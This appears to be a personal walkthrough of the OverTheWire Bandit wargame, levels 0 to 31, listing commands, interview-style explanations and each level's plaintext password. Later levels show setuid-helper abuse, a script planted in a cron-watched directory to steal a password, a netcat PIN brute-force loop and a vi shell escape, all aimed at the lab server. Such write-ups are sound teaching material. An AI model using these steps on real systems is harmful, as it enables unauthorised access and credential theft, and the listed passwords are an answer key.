# Bandit

## Level 0

> commands
ssh  bandit0@bandit.labs.overthewire.org -p 2220

> password

```bash
bandit0
```

## Level 0-1

> commands
ssh  bandit1@bandit.labs.overthewire.org -p 2220
ls  - list all files
cat - read a file

> password

```bash
ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If
```

## Level 1-2    

> commands
ssh  bandit2@bandit.labs.overthewire.org -p 2220
ls  - list all files
cat - read a file

> password 

```bash
263JGJPfgU6LtdEvgfWU1XP5yac29mFx
```

## Level 2-3

> commands
ssh  bandit3@bandit.labs.overthewire.org -p 2220
cat "./--spaces in this filename--"

> password

```bash
MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx

```

## Level 3-4

> commands

ssh  bandit4@bandit.labs.overthewire.org -p 2220
ls  - list all files
cat inhere ---cat: inhere: Is a directory
cd inhere ---cd: inhere: Is a directory
ls -a  - list all files, including hidden ones
cat ...Hiding-From-You

> password

```bash
2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ
```

## Level 4-5

> commands

ssh  bandit5@bandit.labs.overthewire.org -p 2220
cd inhere
pwd -- print working directory
ls - list all files
file ./* --- list all files
./-file07

> password

```bash
4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw
```

## Level 5-6

> commands

ssh  bandit6@bandit.labs.overthewire.org -p 2220
cd inhere
pwd
find . -type f -size 1033c ! -executable
cat ./maybehere07/.file2

> password

```bash
HWasnPhtq9AVKe0dmk45nxy20cvUa6EG
```

## Level 6-7

> commands

ssh  bandit7@bandit.labs.overthewire.org -p 2220
cd / --- root directory
find / -type f -user bandit7 -group bandit6 -size 33c 2>/dev/null
We will use:

/ → search entire system

-type f → files only

-user bandit7 → owned by bandit7

-group bandit6 → group bandit6

-size 33c → exactly 33 bytes (c = bytes)

2>/dev/null → hide permission errors (VERY important)

cat /var/lib/dpkg/info/bandit7.password

> password

```bash
morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj
```
## Level 7-8

> commands

ssh  bandit8@bandit.labs.overthewire.org -p 2220
ls
grep millionth data.txt

What this does:

grep → searches text

millionth → word to search

data.txt → file to search in

> password
```bash
millionth       dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc
```
## Level 8-9
QUESTION 

> A file contains many repeated lines, but the password appears only once.
> 
> **How would you:**
> * Identify unique lines?
> * Sort and filter efficiently?
> * Handle large files?
> 
> **Solution Approach:**
> ```
> # Step 1: Establish SSH connection
> ssh bandit9@bandit.labs.overthewire.org -p 2220
> 
> # Step 2: Sort the file to group identical lines together
> sort data.txt
> # sort → groups same lines together
> 
> # Step 3: Find the line that appears only once
> sort data.txt | uniq -u
> # | → passes output from one command to another
> # uniq -u → shows only lines that appear once
> 
> # Step 4: Save the unique line (password)
> sort data.txt | uniq -u > password.txt
> cat password.txt

> commands

ssh  bandit9@bandit.labs.overthewire.org -p 2220
sort data.txt
sort data.txt | uniq -u

sort → groups same lines together

uniq -u → shows only lines that appear once

| → passes output from one command to another

> password

```bash
4CKMh1JI91bUIZZPXDqGanal4xvAg0JM
```
## Level 9-10
QUESTION 

> You are told the password is hidden inside a file and is the only human-readable string preceded by specific characters.
> 
> **How would you:**
> * Search for readable strings?
> * Filter based on pattern?
> * Extract only relevant content?
> 
> **Solution Approach:**
> ```
> # Step 1: Establish SSH connection
> ssh bandit10@bandit.labs.overthewire.org -p 2220
> 
> # Step 2: Extract human-readable strings from the file
> strings data.txt
> # strings data.txt → extracts readable text from binary/mixed files
> 
> # Step 3: Filter based on the known pattern (multiple equals signs)
> strings data.txt | grep "==="
> # | → sends output forward
> # grep "===" → filters only lines containing "==="
> 
> # Step 4: Extract the password (usually after the === markers)
> strings data.txt | grep "===" | cut -d' ' -f2-
> # Further refine to get just the password part


> commands

ssh  bandit10@bandit.labs.overthewire.org -p 2220
strings data.txt | grep "==="

strings data.txt → gets readable lines

| → sends them forward

grep "===" → filters only lines with ===

> password

```bash
FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey
```

## Level 10-11
QUESTION

> A file contains Base64-encoded data.
> 
> **How would you:**
> * Detect encoding type?
> * Decode it?
> * Verify data integrity?
> 
> **Solution Approach:**
> ```
> # Step 1: Establish SSH connection
> ssh bandit11@bandit.labs.overthewire.org -p 2220
> 
> # Step 2: Detect encoding type by examining file content
> cat data.txt
> # This confirms it is Base64, not normal text
> # Base64 typically contains only A-Z, a-z, 0-9, +, /, and = for padding
> 
> # Step 3: Decode the Base64 data
> # base64 → Tool used to encode or decode Base64 data
> # -d → Means decode
> # data.txt → File containing encoded data
> base64 -d data.txt
> 
> # Step 4: Save decoded output for verification
> base64 -d data.txt > decoded.txt
> 
> # Step 5: Verify integrity by re-encoding and comparing
> base64 decoded.txt | diff - data.txt
> # No output means the decoded data matches original

> commands

ssh  bandit11@bandit.labs.overthewire.org -p 2220

cat data.txt //This confirms it is Base64, not normal text.//

base64 -d data.txt

base64 // Tool used to encode or decode Base64 data//

-d // Means decode //

data.txt // File containing encoded data //

> password

```bash

dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr
```

## Level 11-12
QUESTION 

> You are given data that appears encoded using a simple substitution cipher.
> 
> **How would you:**
> * Identify the cipher type?
> * Decode the message?
> * Validate the decoded output?
> 
> **Solution Approach:**
> ```
> # Step 1: Establish SSH connection
> ssh bandit12@bandit.labs.overthewire.org -p 2220
> 
> # Step 2: Examine the encoded data
> cat data.txt
> # You'll see something unreadable — that's ROT13 text
> 
> # Step 3: Decode using ROT13 translation
> # cat data.txt → Reads the file content
> # | → Pipe: sends output of one command to another
> # tr 'A-Za-z' 'N-ZA-Mn-za-m' → Translates letters using ROT13
> cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
> 
> # Step 4: Save decoded output
> cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m' > decoded.txt
> 
> # Step 5: Validate the decoded output
> cat decoded.txt
> # Should now show readable password/next level credentials

> commands

ssh  bandit12@bandit.labs.overthewire.org -p 2220

cat data.txt  //You’ll see something unreadable — that’s ROT13 text.//

cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'

cat data.txt // Reads the file content //
| // Pipe: sends output of one command to another //
tr 'A-Za-z' 'N-ZA-Mn-za-m' // Translates letters using ROT13: 
                             // 'A-Za-z' = all uppercase & lowercase letters 
                             // 'N-ZA-Mn-za-m' = rotate each letter by 13 positions 
                             // A->N, B->O, ..., Z->M; a->n, b->o, ..., z->m //

> password

```bash
7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4
```
## Level 12-13
QUESTION

> You are given a file that has been compressed multiple times using different formats.
> 
> **How would you:**
> * Identify file type?
> * Decompress layer by layer?
> * Automate extraction if needed?
> 
> **Solution Approach:**
> ```
> # Step 1: Establish SSH connection
> ssh bandit13@bandit.labs.overthewire.org -p 2220
> 
> # Step 2: Create a temporary working directory for safe extraction
> WORKDIR=$(mktemp -d)        # Creates a temporary working directory
> cd $WORKDIR                 # Moves into the temp directory
> 
> # Step 3: Copy the hexdump file to work safely
> cp ~/data.txt .             # Copies given hexdump file to safe location
> 
> # Step 4: Reverse the hexdump back to original binary
> xxd -r data.txt > file      # Reverses hexdump to binary
> 
> # Step 5: Identify file type and decompress layer by layer
> 
> # Layer 1: Identify and decompress gzip
> file file                    # Checks file type (gzip)
> mv file file.gz              # Renames to .gz for gunzip
> gunzip file.gz               # Decompresses gzip file
> 
> # Layer 2: Identify and decompress bzip2
> file file                    # Checks type (bzip2)
> mv file file.bz2             # Renames to .bz2
> bunzip2 file.bz2             # Decompresses bzip2
> 
> # Layer 3: Identify and extract tar archive
> file file                    # Checks type (tar)
> mv file file.tar             # Renames to .tar
> tar -xf file.tar             # Extracts tar archive
> 
> # Layer 4: Extract tar from data5.bin
> file data5.bin               # Checks type (tar)
> mv data5.bin data5.tar       # Renames to tar
> tar -xf data5.tar            # Extracts tar archive
> 
> # Layer 5: Decompress bzip2 from data6.bin
> file data6.bin               # Checks type (bzip2)
> mv data6.bin data6.bz2       # Renames to bzip2
> bunzip2 data6.bz2            # Decompresses bzip2
> 
> # Layer 6: Extract tar from data6
> file data6                   # Checks type (tar)
> mv data6 data6.tar           # Renames to tar
> tar -xf data6.tar            # Extracts tar archive
> 
> # Layer 7: Decompress gzip from data8.bin
> file data8.bin               # Checks type (gzip)
> mv data8.bin data8.gz        # Renames to gzip
> gunzip data8.gz              # Decompresses gzip
> 
> # Final Layer: Read the password
> file data8                   # Confirms ASCII text
> cat data8                    # Displays password for Bandit Level 13



> commands

ssh  bandit13@bandit.labs.overthewire.org -p 2220

WORKDIR=$(mktemp -d)        // Creates a temporary working directory //
cd $WORKDIR                // Moves into the temp directory //

cp ~/data.txt .            // Copies the given hexdump file to work safely //

xxd -r data.txt > file     // Reverses the hexdump back to original binary //

file file                  // Checks the file type (gzip) //

mv file file.gz            // Renames file to .gz so gunzip can read it //
gunzip file.gz             // Decompresses gzip file //

file file                  // Checks next compression type (bzip2) //

mv file file.bz2           // Renames file to .bz2 //
bunzip2 file.bz2           // Decompresses bzip2 file //

file file                  // Checks file type (tar archive) //

mv file file.tar            // Renames file to .tar //
tar -xf file.tar            // Extracts tar archive //

file data5.bin             // Checks extracted file type (tar) //

mv data5.bin data5.tar     // Renames to tar //
tar -xf data5.tar          // Extracts tar archive //

file data6.bin             // Checks file type (bzip2) //

mv data6.bin data6.bz2     // Renames to bzip2 //
bunzip2 data6.bz2          // Decompresses bzip2 file //

file data6                 // Checks file type (tar archive) //

mv data6 data6.tar         // Renames to tar //
tar -xf data6.tar          // Extracts tar archive //

file data8.bin             // Checks file type (gzip) //

mv data8.bin data8.gz      // Renames to gzip //
gunzip data8.gz            // Decompresses gzip file //

file data8                 // Confirms ASCII text (final password file) //

cat data8                  // Displays password for Bandit Level 13 //


> password

```bash
FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn

```

## Level 13-14
QUESTION

> You are given an SSH private key instead of a password.
> 
> **How would you:**
> * Securely use the private key?
> * Adjust file permissions?
> * Authenticate using key-based login?
> 
> **Solution Approach:**
> ```
> # Step 1: Log out of current SSH session (if inside bandit13)
> exit
> 
> # Step 2: Securely use the private key with proper permissions
> # SSH requires private keys to have strict permissions
> chmod 600 sshkey.private
> 
> # Step 3: Authenticate using key-based login
> ssh -i sshkey.private bandit14@bandit.labs.overthewire.org -p 2220
> 
> # Step 4: Retrieve the password for the next level
> cat /etc/bandit_pass/bandit14


> commands

ssh  bandit14@bandit.labs.overthewire.org -p 2220
exit // log out first
ssh -i sshkey.private bandit14@bandit.labs.overthewire.org -p 2220
cat /etc/bandit_pass/bandit14 

> password

```bash
MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS
```

## Level 14-15
QUESTION

> You are told to submit the current level password to a service running on localhost.
> 
> **How would you:**
> * Connect to a local port?
> * Send structured input?
> * Capture the server response?
> 
> **Solution Approach:**
> ```
> # Step 1: Establish SSH connection to target system
> ssh bandit15@bandit.labs.overthewire.org -p 2220
> 
> # Step 2: Connect to local service using netcat
> # nc → netcat tool (connect to ports)
> # localhost → your own machine
> # 30000 → port number
> nc localhost 30000
> 
> # Step 3: Send structured input to the service
> # The connection will wait for input
> # Paste the bandit14 password
> <bandit14_password>
> 
> # Step 4: Submit and capture server response
> # Press Enter to send
> # Server validates password and returns next level credentials


> commands

ssh  bandit15@bandit.labs.overthewire.org -p 2220
nc localhost 30000
//nc → netcat tool (connect to ports)
localhost → your own machine
30000 → port number//
It will just wait.
 Now paste the bandit14 password
 Press Enter

> password

```bash
8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo
```

## Level 15-16
QUESTION

> A service requires SSL/TLS connection on a specific port to receive and validate a password.
> 
> **How would you:**
> * Establish a secure connection?
> * Validate certificate handshake?
> * Send correct authentication data?
> 
> **Solution Approach:**
> ```
> # Step 1: Establish SSH connection to target system
> ssh bandit16@bandit.labs.overthewire.org -p 2220
> 
> # Step 2: Establish SSL/TLS connection to the service
> # openssl → cryptography tool
> # s_client → SSL client mode
> # -connect → connect to server
> openssl s_client -connect localhost:30001
> 
> # Step 3: Validate certificate handshake
> # During connection, observe:
> # - SSL handshake completion messages
> # - Certificate chain verification
> # - Session negotiation details
> 
> # Step 4: Send authentication data
> # After connection is established, enter:
> <bandit15_password>
> # Press Enter to submit
> 
> # Step 5: Receive response
> # Service will validate password and return next level credentials


> commands

ssh  bandit16@bandit.labs.overthewire.org -p 2220
openssl s_client -connect localhost:30001

openssl → cryptography tool
s_client → SSL client mode
-connect → connect to server

> password

```bash
kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx
```

## Level 16-17
QUESTION
> Multiple network services are running on different ports. Only one responds with the correct SSL-encrypted service.
> 
> **How would you:**
> * Scan open ports?
> * Identify SSL-enabled services?
> * Interact securely with the correct port?
> 
> **Solution Approach:**
> ```
> # Step 1: Establish SSH connection to target system
> ssh bandit17@bandit.labs.overthewire.org -p 2220
> 
> # Step 2: Scan for open ports in the specified range
> nmap -p 31000-32000 localhost
> # Identifies which ports are listening for connections
> 
> # Step 3: Identify SSL-enabled services among open ports
> # For each open port, attempt SSL connection
> # Look for SSL handshake completion and service banners
> 
> # Step 4: Connect to the correct SSL-enabled port
> openssl s_client -connect localhost:PORT
> # Replace PORT with the discovered port running SSL service
> 
> # Step 5: Submit the current level password
> <bandit16_password>
> # After connection, enter the password to receive next level credentials
> 
> # Step 6: Save the received SSH private key
> nano key17
> # Paste the RSA private key received from the SSL service
> 
> # Step 7: Set proper permissions for SSH key
> chmod 600 key17
> # SSH requires private keys to have strict permissions
> 
> # Step 8: Use the key to access next level
> ssh -i key17 bandit17@bandit.labs.overthewire.org -p 2220
> # Successfully logs into bandit17 using the private key

> commands

ssh  bandit17@bandit.labs.overthewire.org -p 2220
nmap -p 31000-32000 localhost
openssl s_client -connect localhost:PORT
<bandit16_password>
nano key17
chmod 600 key17
ssh -i key17 bandit17@bandit.labs.overthewire.org -p 2220

> password

```bash
BMIOFKM7CRSLI97voLp3TD80NAq5exxk
```

## Level 17-18
QUESTION
> Two files exist in the directory. Only one contains the correct password. The difference between them reveals the solution.
> 
> **How would you:**
> * Compare the two files?
> * Extract only the differing content?
> * Automate comparison if files are large?
> 
> **Solution Approach:**
> ```
> # Step 1: Establish SSH connection to target system
> ssh bandit18@bandit.labs.overthewire.org -p 2220
> 
> # Step 2: List files in current directory
> ls
> # Identifies the two files: passwords.old and passwords.new
> 
> # Step 3: Compare files using diff command
> diff passwords.old passwords.new
> # Shows lines that differ between the two files
> # Output format: < indicates lines in first file, > indicates lines in second file
> 
> # Step 4: Alternative comparison methods
> # View only unique lines from second file
> comm -23 <(sort passwords.new) <(sort passwords.old)
> 
> # Use grep to find lines in new file not in old file
> grep -v -f passwords.old passwords.new
> 
> # For binary files or checksum comparison
> md5sum passwords.old passwords.new
> sha256sum passwords.old passwords.new
> 
> # Step 5: Extract the differing content (the new password)
> # The line marked with '>' in diff output is the password
> diff passwords.old passwords.new | grep '>' | cut -d ' ' -f2-
> ```


> commands

ssh  bandit18@bandit.labs.overthewire.org -p 2220
ls
diff passwords.old passwords.new



> password

```bash
x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO
```

## Level 18-19
QUESTION
> You SSH into a system but it immediately logs you out after login.
> 
> **How would you:**
> * Investigate why the session terminates?
> * Check startup files?
> * Bypass the forced logout mechanism?
> 
> **Solution Approach:**
> ```
> # Step 1: Attempt SSH connection with command execution to bypass shell
> # Instead of getting an interactive shell, directly execute a command
> ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme
> # This connects, runs 'cat readme', and prints the password before disconnecting
> 
> # Step 2: Alternative - SSH with different command to investigate
> ssh bandit18@bandit.labs.overthewire.org -p 2220 ls -la
> # List files in home directory to locate readme or other files
> 
> # Step 3: Check for modified startup files (.bashrc, .profile, etc.)
> ssh bandit18@bandit.labs.overthewire.org -p 2220 "cat .bashrc"
> # Examine bashrc for logout commands or modified configurations
> 
> # Step 4: If you need the password for next level (bandit19)
> ssh bandit19@bandit.labs.overthewire.org -p 2220
> # Use retrieved password to access next level

> commands

ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme //- This will connect, run cat readme, and print the contents (the password) before disconnecting.
//
ssh  bandit19@bandit.labs.overthewire.org -p 2220

> password

```bash
cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8
```

## Level 19-20
QUESTION

> You find a binary file in the user's home directory that executes commands as another user.
> 
> **How would you:**
> * Determine if it has elevated privileges?
> * Test what it can execute?
> * Abuse it to retrieve restricted data?
> 
> **Solution Approach:**
> ```
> # Step 1: Establish SSH connection to target system
> ssh bandit20@bandit.labs.overthewire.org -p 2220
> 
> # Step 2: Examine file permissions to identify elevated privileges
> ls -l
> # Look for SUID bit (s in permissions) or special ownership
> # Example output shows bandit20-do with special permissions
> 
> # Step 3: Analyze the binary's behavior without executing dangerous commands
> ./bandit20-do
> # Run without arguments to see help/usage information
> # Reveals it executes commands as bandit21 user
> 
> # Step 4: Test basic command execution through the binary
> ./bandit20-do whoami
> # Confirms commands run as bandit21 (higher privilege user)
> 
> # Step 5: Abuse elevated privileges to retrieve restricted credentials
> ./bandit20-do cat /etc/bandit_pass/bandit20
> # Successfully accesses password file as bandit21


> commands

ssh  bandit20@bandit.labs.overthewire.org -p 2220

ls -l
./bandit20-do
./bandit20-do cat /etc/bandit_pass/bandit20

> password

```bash
0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
```

## Level 20-21
QUESTION

> A service is running locally and expects a password via TCP connection. You already know the password but must send it through a specific method.
> 
> **How would you:**
> * Identify the listening service?
> * Interact with it securely?
> * Automate communication if needed?
> 
> **Solution Approach:**
> ```
> # Step 1: Establish SSH connection to target system
> ssh bandit21@bandit.labs.overthewire.org -p 2220
> 
> # Step 2: Identify listening services/netcat connections
> # Check for running processes or open ports
> ps aux | grep -i nc
> netstat -tulpn | grep LISTEN
> 
> # Step 3: Set up a listener to send the password
> # Use netcat to listen on a specific port and send the known password
> echo -n '0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO' | nc -l -p 1234 &
> # The '&' runs this in background, listening on port 1234
> 
> # Step 4: Connect to the service that will receive the password
> ./suconnect 1234
> # This connects to port 1234 and retrieves the password from the listener
> # The service validates the password and returns the next level credentials
> ```

> commands

ssh  bandit21@bandit.labs.overthewire.org -p 2220
echo -n '0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO' | nc -l -p 1234 &
./suconnect 1234

> password

```bash
EeoULMCra2q0dSkYj561DX7s1CpBuOBt
```

## Level 21-22
QUESTION

> You discover a cron job running every minute that executes a script owned by another user. The script writes output to a temporary location.
> 
> **How would you:**
> * Identify the cron job?
> * Analyze what it does?
> * Determine if it exposes sensitive information?
> 
> **Solution Approach:**
> ```
> # Step 1: Establish SSH connection to target system
> ssh bandit22@bandit.labs.overthewire.org -p 2220
> 
> # Step 2: Identify cron jobs by examining cron directories
> ls /etc/cron.d/
> # Lists all system cron jobs to find those targeting bandit22/bandit21
> 
> # Step 3: Analyze the specific cron job configuration
> cat /etc/cron.d/cronjob_bandit22
> # View cron schedule and script location:
> # * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
> 
> # Step 4: Examine the script being executed by cron
> cat /usr/bin/cronjob_bandit22.sh
> # Analyze script functionality to understand what it does
> 
> # Step 5: Locate and examine the temporary output file
> # Based on script analysis, find where output is written
> cat /tmp/some_random_filename
> # View contents to check for exposed sensitive information
> # (filename would be identified from script analysis)
> ```


> commands

ssh  bandit22@bandit.labs.overthewire.org -p 2220
ls /etc/cron.d/
cat /etc/cron.d/cronjob_bandit22
cat /usr/bin/cronjob_bandit22.sh
cat /tmp/some_random_filename

> password

```bash
tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
```

## Level 22-23
QUESTION 

> ## 🔥 Interview Scenario Question (Level 22 → 23 Type)
> 
> You have access to a low-privileged Linux account.
> 
> During enumeration, you discover:
> * A cron job running every minute
> * The cron job executes a script owned by another user
> * The script creates a file in /tmp using a hashed filename
> * The file contains sensitive credentials
> 
> **Your task is:**
> * Analyze the cron job behavior
> * Determine how the filename is generated
> * Retrieve the stored credential
> * Explain the security flaw
> * Explain your step-by-step approach
> 
> **Solution Approach:**
> ```
> # Step 1: Establish SSH connection to target system
> ssh bandit23@bandit.labs.overthewire.org -p 2220
> 
> # Step 2: Locate and list cron jobs
> ls /etc/cron.d/
> # Identify cron job configurations in the system directory
> 
> # Step 3: Examine the specific cron job for bandit23
> cat /etc/cron.d/cronjob_bandit23
> # View cron job configuration to understand schedule and script location
> 
> # Step 4: Analyze the script being executed by cron
> cat /usr/bin/cronjob_bandit23.sh
> # Examine script contents to understand filename generation logic
> 
> # Step 5: Determine how the filename is generated
> # Based on script analysis, replicate the filename generation
> echo "I am user bandit23" | md5sum
> # This produces the hashed filename: 8ca319486bfbbc3663ea0fbe81326349
> 
> # Step 6: Retrieve the stored credential from the generated filename
> cat /tmp/8ca319486bfbbc3663ea0fbe81326349
> # Successfully accesses the sensitive credential

> commands

ssh  bandit23@bandit.labs.overthewire.org -p 2220
ls /etc/cron.d/
cat /etc/cron.d/cronjob_bandit23
cat /usr/bin/cronjob_bandit23.sh
echo I am user bandit23 | md5sum
cat /tmp/8ca319486bfbbc3663ea0fbe81326349

> password

```bash
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
```

## Level 23-24
QUESTION

> ## 🔥 Interview Scenario Question (Level 23 → 24 Type)
> 
> You have access to a low-privileged Linux user account.
> 
> While performing enumeration, you discover:
> * A cron job running every minute
> * The cron job executes scripts from a specific directory
> * The cron job runs with higher privileges than your user
> 
> **Your task is:**
> * Analyze the cron job
> * Identify if it can be abused
> * Escalate privileges to retrieve a protected credential
> * Explain the security flaw
> * Explain your step-by-step approach
> 
> **Solution Approach:**
> ```
> # Step 1: Establish SSH connection to target system
> ssh bandit24@bandit.labs.overthewire.org -p 2220
> 
> # Step 2: Locate and analyze cron jobs
> cd /etc/cron.d/
> ls -l
> # List all cron jobs to identify those running with elevated privileges
> 
> # Step 3: Examine the specific cron job for bandit24
> cat cronjob_bandit24
> # View cron job configuration to understand schedule and script location
> 
> # Step 4: Analyze the script being executed by cron
> cat /usr/bin/cronjob_bandit24.sh
> # Examine script contents to understand its functionality and permissions
> 
> # Step 5: Navigate to the writable directory where scripts are executed
> cd /var/spool/bandit24/foo/
> # This directory is monitored by cron and executes any scripts found
> 
> # Step 6: Create a malicious script to extract credentials
> echo '#!/bin/bash
> cat /etc/bandit_pass/bandit24 > /tmp/bandit23_pw.txt' > myscript.sh
> # Script will copy the password to a world-readable location
> 
> # Step 7: Make the script executable
> chmod +x myscript.sh
> # Ensure cron can execute it
> 
> # Step 8: Wait for cron to execute (runs every minute)
> # After execution, retrieve the extracted password
> cat /tmp/bandit23_pw.txt
> # Successfully retrieves the bandit24 password


> commands

ssh  bandit24@bandit.labs.overthewire.org -p 2220
cd /etc/cron.d/
ls -l
cat cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
cd /var/spool/bandit24/foo/
echo '#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit23_pw.txt' > myscript.sh
chmod +x myscript.sh
cat /tmp/bandit23_pw.txt

> password

```bash
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

## Level 24-25
QUESTION

> ## 🔥 Interview Scenario Question (Level 24 → 25 Type)
> 
> You are given access to a Linux system. There is a local TCP service running on a specific port.
> 
> The service expects:
> * A known password
> * Followed by a 4-digit PIN
> 
> If both are correct, it returns a secret credential. You do not know the PIN.
> 
> **Explain step-by-step:**
> * How you would analyze the service
> * How you would design a solution
> * How you would automate the attack
> * What security weakness this represents
> 
> **Solution Approach:**
> ```
> # Step 1: Establish SSH connection to the target system
> ssh bandit25@bandit.labs.overthewire.org -p 2220
> 
> # Step 2: Analyze the service by testing manual connection
> # First, identify the service port (assumed to be 30002 based on context)
> # Test connection to understand behavior
> echo "test" | nc localhost 30002
> 
> # Step 3: Design brute-force solution using bash one-liner
> # Generate all possible PIN combinations (0000-9999)
> # Combine known password with each PIN and send to service
> 
> # Step 4: Automate the attack using a loop with netcat
> for i in $(seq -w 0000 9999); do
>     # Send known password + current PIN combination
>     echo "$(cat /etc/bandit_pass/bandit24) $i"
> done | nc localhost 30002
> 
> # The service will return the secret credential when correct PIN is found


> commands

ssh  bandit25@bandit.labs.overthewire.org -p 2220
for i in $(seq -w 0000 9999); do
    echo "$(cat /etc/bandit_pass/bandit24) $i"
done | nc localhost 30002

> password

```bash
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

## Level 25-26
QUESTION

> ## Interview Scenario Question
> 
> You SSH into a Linux server using valid credentials.
> After login:
> * You do not get a normal /bin/bash shell
> * The session immediately exits or behaves strangely
> * You suspect the user has a non-standard shell configured
> 
> **Explain step-by-step:**
> * How you would identify which shell is being used
> * How you would analyze its behavior
> * How you would attempt to break out into a normal interactive shell
> * What security misconfiguration this represents
> 
> **Solution Approach:**
> ```
> # Step 1: Establish SSH connection to the target
> ssh bandit26@bandit.labs.overthewire.org -p 2220
> 
> # Step 2: Identify the shell being used for bandit26 user
> cat /etc/passwd | grep bandit26
> # Reveals the custom shell/executable configured for this user
> 
> # Step 3: Analyze the custom shell script's behavior
> cat /usr/bin/showtext
> # Examines the script content to understand its functionality and limitations
> 
> # Step 4: Attempt to break out into a normal interactive shell
> # Within the restricted environment, set shell to /bin/bash
> :set shell=/bin/bash
> # Execute shell escape to gain normal interactive access
> :shell
> 
> # Step 5: Once normal shell access is obtained, retrieve credentials
> cat /etc/bandit_pass/bandit26
> # Successfully retrieves the password


> commands

ssh  bandit26@bandit.labs.overthewire.org -p 2220
cat /etc/passwd | grep bandit26
cat /usr/bin/showtext
:set shell=/bin/bash
:shell
cat /etc/bandit_pass/bandit26

> password

```bash
s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
```

## Level 26-27
QUESTION

> You successfully gained shell access to a Linux server, but it is running in a restricted environment. You cannot execute normal commands directly.
> 
> **Your task is to:**
> * Escape the restricted shell (if possible)
> * Enumerate available files
> * Retrieve a specific credential stored on the system
> 
> **Explain how you would approach this step-by-step.**
> 
> **Solution Approach:**
> ```
> # Step 1: Connect to the target server
> ssh bandit27@bandit.labs.overthewire.org -p 2220
> 
> # Step 2: Enumerate available files in current directory
> ls
> # Output shows: text.txt
> 
> # Step 3: Examine file types to identify potential escape vectors
> file bandit27-do
> # Identifies the file type and permissions
> 
> # Step 4: Execute the binary to test functionality
> ./bandit27-do whoami
> # Reveals execution context/privileges
> 
> # Step 5: Leverage the binary to access restricted credentials
> ./bandit27-do cat /etc/bandit_pass/bandit27
> # Successfully retrieves the password for bandit27
> ```


> commands

ssh  bandit27@bandit.labs.overthewire.org -p 2220
ls
text.txt
file bandit27-do
./bandit27-do whoami
./bandit27-do cat /etc/bandit_pass/bandit27

> password

```bash
upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
```

## Level 27-28
QUESTION

> ## 🔐 Security Challenge
> 
> You are given SSH access credentials to a Git server running on a non-standard port (2220). The repository is hosted remotely.
> 
> **Tasks:**
> * Clone the repository securely from your local machine
> * Analyze it
> * Find hidden credentials inside
> 
> **Question:** Explain step-by-step how you would approach this


> commands
---------------------------------------------------
> **Challenge:** You are given SSH access credentials to a Git server running on a non-standard port (2220), where a repository is hosted remotely, requiring you to: (1) clone the repository securely from your local machine, (2) analyze it, and (3) find hidden credentials inside — explain step-by-step how you would approach this.
> 
> **Solution Approach:**
> ```
> # Step 1: Establish SSH connection to the server
> ssh bandit28@bandit.labs.overthewire.org -p 2220
> 
> # Step 2: Create temporary directory for cloning
> mkdir /tmp/bandit27repo
> cd /tmp/bandit27repo
> 
> # Step 3: Clone the repository securely using SSH key
> GIT_SSH_COMMAND='ssh -i sshkey.private -p 2220' git clone ssh://bandit27-git@bandit.labs.overthewire.org/home/bandit27-git/repo
> 
> # Step 4: Navigate to cloned repository
> cd repo
> 
> # Step 5: List contents to analyze repository structure
> ls -la
> 
> # Step 6: Examine files to find hidden credentials
> cat README
> ```
----------------------------------------------

ssh  bandit28@bandit.labs.overthewire.org -p 2220
mkdir /tmp/bandit27repo
cd /tmp/bandit27repo
GIT_SSH_COMMAND='ssh -i sshkey.private -p 2220' git clone ssh://bandit27-git@bandit.labs.overthewire.org/home/bandit27-git/repo
cd repo
ls -la
cat README
> password

```bash
Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN
```

## Level 28-29

> commands

ssh  bandit29@bandit.labs.overthewire.org -p 2220
mkdir /tmp/bandit28repo
cd /tmp/bandit28repo
GIT_SSH_COMMAND='ssh -p 2220' git clone ssh://bandit28-git@bandit.labs.overthewire.org/home/bandit28-git/repo
cd repo
ls -la
cat README
git log
git show <commit-hash>
git log -p

> password

```bash
4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7
```

## Level 29-30

> commands

ssh  bandit30@bandit.labs.overthewire.org -p 2220
mkdir /tmp/bandit29repo
cd /tmp/bandit29repo
GIT_SSH_COMMAND='ssh -p 2220' git clone ssh://bandit29-git@bandit.labs.overthewire.org/home/bandit29-git/repo
cd repo
ls -la
cat README.md
git branch -a
git checkout dev
cat README.md

> password

```bash
qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL
```

## Level 30-31

> commands

ssh  bandit31@bandit.labs.overthewire.org -p 2220
mkdir /tmp/bandit30repo
cd /tmp/bandit30repo
GIT_SSH_COMMAND='ssh -p 2220' git clone ssh://bandit30-git@bandit.labs.overthewire.org/home/bandit30-git/repo
cd repo
ls -la
cat README.md
git tag
git show secret //secret --tag name--//

> password

```bash
fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy
```

## Level 31-32

> commands

